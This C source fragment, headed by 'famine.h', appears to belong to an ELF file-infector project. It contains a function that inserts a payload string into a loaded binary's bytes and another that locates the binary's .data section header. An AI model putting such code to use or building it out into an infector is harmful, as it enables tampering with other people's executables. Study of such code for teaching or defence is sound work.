#include "famine.h"

int         appendSignature(struct bfile file, size_t offset) {
  size_t  i;
  void    *tmp;
  size_t  toAdd;
  size_t  total;

  i = file.size - 1;
  tmp = file.header;
  toAdd = strlen(payload) + 1;
  total = file.size - offset;
  memmove(tmp + i + toAdd - total, tmp + i - total, total);
  i -= total - 1;
  memcpy(tmp + i, payload, toAdd);
  return (0);
}

Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, ".data") != 0)
    pointer += 1;
  return (pointer);
}

